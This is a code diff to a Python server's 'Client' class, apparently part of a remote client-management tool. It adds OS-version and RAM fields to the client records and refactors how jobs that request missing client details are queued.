@@ -30,6 +30,10 @@ class Client:
 					db.cursor.execute('''UPDATE clients SET architecture = %s WHERE id = %s''', [command, self.id])
 				elif self.pending_job['payload'] == 'system':
 					db.cursor.execute('''UPDATE clients SET system = %s WHERE id = %s''', [command, self.id])
+				elif self.pending_job['payload'] == 'system_ver':
+					db.cursor.execute('''UPDATE clients SET system_ver = %s WHERE id = %s''', [command, self.id])
+				elif self.pending_job['payload'] == 'ram':
+					db.cursor.execute('''UPDATE clients SET ram = %s WHERE id = %s''', [command, self.id])
 				elif self.pending_job['payload'] == 'interval':
 					db.cursor.execute('''UPDATE clients SET interval = %s WHERE id = %s''', [command, self.id])
 			db.handler.commit()
@@ -103,8 +107,6 @@ class Client:
 			else:
 				self.disconnect()
 
-
-	
 	def send_command (self, args):
 		self.raw_send(commands.encode(args))
 	
@@ -140,11 +142,11 @@ class Client:
 		if not client:
 			return False
 
-		if not client['architecture']:
-			db.cursor.execute('''INSERT INTO jobs (userkey, type, payload) VALUES (%s, %s, %s)''', [self.key, 'get', 'architecture'])
-		
-		if not client['system']:
-			db.cursor.execute('''INSERT INTO jobs (userkey, type, payload) VALUES (%s, %s, %s)''', [self.key, 'get', 'system'])
+		fillable_data = ['architecture', 'system', 'system_ver', 'ram']
+
+		for data in fillable_data:
+			if not client[data]:
+				db.cursor.execute('''INSERT INTO jobs (userkey, type, payload) VALUES (%s, %s, %s)''', [self.key, 'get', data])
 
 		db.handler.commit()
 		db.handler.close()
